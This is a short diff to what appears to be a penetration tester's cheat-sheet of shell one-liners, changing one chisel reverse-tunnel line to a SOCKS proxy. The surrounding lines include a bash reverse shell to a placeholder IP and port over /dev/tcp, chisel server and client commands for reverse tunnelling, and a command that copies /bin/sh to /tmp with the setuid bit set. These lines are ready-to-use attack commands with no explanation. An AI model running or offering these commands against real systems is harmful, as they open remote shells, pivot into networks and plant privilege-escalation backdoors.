@@ -1,6 +1,6 @@
 alias ls='ls -at --full-time'
 bash -i >& /dev/tcp/IP/PORT 0>&1
-chisel client IP:PORT R:PORT:IP:PORT
+chisel client IP:PORT R:PORT:socks
 chisel client IP:PORT R:socks
 chisel server -p PORT --reverse
 cp /bin/sh /tmp/sh && chmod +s /tmp/sh
